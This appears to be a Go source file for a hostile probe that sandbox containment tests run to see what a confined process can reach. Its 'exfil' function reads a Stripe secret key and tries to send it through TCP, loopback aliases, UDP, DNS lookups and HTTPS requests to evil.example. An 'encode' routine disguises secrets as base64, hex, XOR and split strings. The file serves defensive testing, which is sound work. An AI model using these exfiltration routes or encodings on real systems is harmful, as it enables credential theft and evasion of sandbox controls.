// Command probe is the hostile process the containment tests run inside a
// sandbox: it reports what a caller in that sandbox can reach.
package main

import (
	"bufio"
	"encoding/base64"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"io"
	"net"
	"net/http"
	"net/url"
	"os"
	"strings"
	"time"
)

func main() {
	if len(os.Args) < 2 {
		os.Exit(64)
	}
	switch os.Args[1] {
	case "gateway":
		gateway()
	case "hidden":
		hidden(os.Args[2])
	case "dial":
		dial(os.Args[2])
	case "fake-client":
		fakeClient(os.Args[2], os.Args[3:])
	case "exfil":
		exfil(os.Args[2])
	case "request":
		request(os.Args[2:])
	case "ptrace":
		ptrace(os.Args[2])
	case "nested":
		nested()
	case "traverse":
		traverse(os.Args[2], os.Args[3])
	case "encode":
		encode(os.Getenv(os.Args[2]), os.Args[3:])
	default:
		os.Exit(64)
	}
}

// encode prints value in the forms a hostile child can choose, one
// "name=output" line each. An optional file argument also receives the base64
// form.
func encode(value string, args []string) {
	fmt.Println("plain=" + value)
	fmt.Println("base64=" + base64.StdEncoding.EncodeToString([]byte(value)))
	fmt.Println("base64url=" + base64.RawURLEncoding.EncodeToString([]byte(value)))
	fmt.Println("hex=" + hex.EncodeToString([]byte(value)))
	fmt.Println("url=" + url.QueryEscape(value))
	xor := make([]byte, len(value))
	for i := range value {
		xor[i] = value[i] ^ 0x2a
	}
	fmt.Println("xor=" + hex.EncodeToString(xor))
	half := len(value) / 2
	fmt.Println("split-1=" + value[:half])
	fmt.Println("split-2=" + value[half:])
	if len(args) > 0 {
		if err := os.WriteFile(args[0], []byte(base64.StdEncoding.EncodeToString([]byte(value))), 0o600); err != nil {
			fmt.Println("write:", err)
			os.Exit(1)
		}
	}
}

// gateway sends one request to the gateway URL the child was given.
func gateway() {
	req, err := http.NewRequest(http.MethodGet, os.Getenv("KEYLATCH_GATEWAY_URL")+"/probe", nil)
	if err != nil {
		fmt.Println("request:", err)
		os.Exit(1)
	}
	req.Header.Set("Authorization", "Bearer "+os.Getenv("KEYLATCH_GATEWAY_TOKEN"))
	resp, err := (&http.Client{Timeout: 5 * time.Second}).Do(req)
	if err != nil {
		fmt.Println("gateway:", err)
		os.Exit(1)
	}
	defer resp.Body.Close()
	body, _ := io.ReadAll(resp.Body)
	fmt.Printf("%s|%s\n", body, os.Getenv("OPENROUTER_API_KEY"))
}

// hidden reports whether path can be listed or read.
func hidden(path string) {
	if _, err := os.Stat(path); err != nil {
		fmt.Println("hidden")
		return
	}
	fmt.Println("visible")
	os.Exit(1)
}

// dial reports whether a TCP address is reachable.
func dial(addr string) {
	c, err := net.DialTimeout("tcp", addr, 2*time.Second)
	if err != nil {
		fmt.Println("unreachable")
		return
	}
	_ = c.Close()
	fmt.Println("reachable")
	os.Exit(1)
}

// fakeClient speaks the control protocol directly, as a planted keylatch
// would, and prints what the daemon answers.
func fakeClient(socket string, verbArgs []string) {
	conn, err := net.DialTimeout("unix", socket, 2*time.Second)
	if err != nil {
		fmt.Println("dial:", err)
		os.Exit(1)
	}
	defer conn.Close()
	req := map[string]any{"op": "exec", "verb": verbArgs[0], "args": verbArgs[1:]}
	if err := json.NewEncoder(conn).Encode(req); err != nil {
		os.Exit(1)
	}
	line, err := bufio.NewReader(conn).ReadBytes('\n')
	if err != nil {
		fmt.Println("read:", err)
		os.Exit(1)
	}
	fmt.Print(string(line))
}

// exfil tries every route a hostile child has to send its credential to the
// sink at addr and prints one "route=result" line per attempt.
func exfil(addr string) {
	key := os.Getenv("STRIPE_SECRET_KEY")
	host, port, _ := net.SplitHostPort(addr)
	report := func(route string, err error) {
		if err != nil {
			fmt.Printf("%s=blocked\n", route)
			return
		}
		fmt.Printf("%s=reached\n", route)
	}
	tcp := func(target string) error {
		c, err := net.DialTimeout("tcp", target, 2*time.Second)
		if err != nil {
			return err
		}
		_, _ = c.Write([]byte(key))
		return c.Close()
	}
	report("tcp-direct", tcp(addr))
	for _, alias := range []string{"0.0.0.0", "localhost", "[::1]", "2130706433", "0x7f000001", "127.1"} {
		report("tcp-"+alias, tcp(alias+":"+port))
	}
	udp := func() error {
		c, err := net.Dial("udp", addr)
		if err != nil {
			return err
		}
		defer c.Close()
		if _, err := c.Write([]byte(key)); err != nil {
			return err
		}
		_ = c.SetReadDeadline(time.Now().Add(time.Second))
		_, err = c.Read(make([]byte, 8))
		return err
	}
	report("udp", udp())
	_, err := net.LookupHost(strings.ToLower(key) + ".exfil.example")
	report("dns", err)

	client := &http.Client{Timeout: 4 * time.Second, Transport: &http.Transport{Proxy: http.ProxyFromEnvironment}}
	get := func(url string) error {
		req, _ := http.NewRequest("GET", url, nil)
		req.Header.Set("Authorization", "Bearer "+key)
		resp, err := client.Do(req)
		if err != nil {
			return err
		}
		defer resp.Body.Close()
		if resp.StatusCode >= 400 {
			return fmt.Errorf("status %d", resp.StatusCode)
		}
		return nil
	}
	report("proxy-https-other-host", get("https://evil.example/x?k="+key))
	report("proxy-https-ip", get("https://203.0.113.9/x"))
	report("proxy-https-loopback-name", get("https://localhost:"+port+"/x"))
	report("proxy-http-sink", get("http://"+host+":"+port+"/x?k="+key))
}

// request sends one HTTPS request through the proxy named in the environment.
// Usage: request METHOD URL [-H name=value]... [-d body] [-authority host] [-then URL]
func request(args []string) {
	method, url := args[0], args[1]
	var body, authority, then string
	headers := map[string]string{}
	for i := 2; i+1 < len(args); i += 2 {
		switch args[i] {
		case "-H":
			k, v, _ := strings.Cut(args[i+1], "=")
			headers[k] = v
		case "-d":
			body = args[i+1]
		case "-authority":
			authority = args[i+1]
		case "-then":
			then = args[i+1]
		}
	}
	client := &http.Client{
		Timeout:       8 * time.Second,
		Transport:     &http.Transport{Proxy: http.ProxyFromEnvironment, ForceAttemptHTTP2: true},
		CheckRedirect: func(*http.Request, []*http.Request) error { return http.ErrUseLastResponse },
	}
	var send func(url string)
	send = func(url string) {
		var rd io.Reader
		if body != "" {
			rd = strings.NewReader(body)
		}
		req, err := http.NewRequest(method, url, rd)
		if err != nil {
			fmt.Println("error:", err)
			return
		}
		for k, v := range headers {
			req.Header.Set(k, v)
		}
		if authority != "" {
			req.Host = authority
		}
		resp, err := client.Do(req)
		if err != nil {
			fmt.Println("error:", err)
			return
		}
		defer resp.Body.Close()
		b, _ := io.ReadAll(resp.Body)
		fmt.Printf("status=%d proto=%s body=%s\n", resp.StatusCode, resp.Proto, strings.TrimSpace(string(b)))
		if loc := resp.Header.Get("Location"); loc != "" && then == "follow" {
			defer send(loc)
		}
	}
	send(url)
	if then != "" && then != "follow" {
		send(then)
	}
}
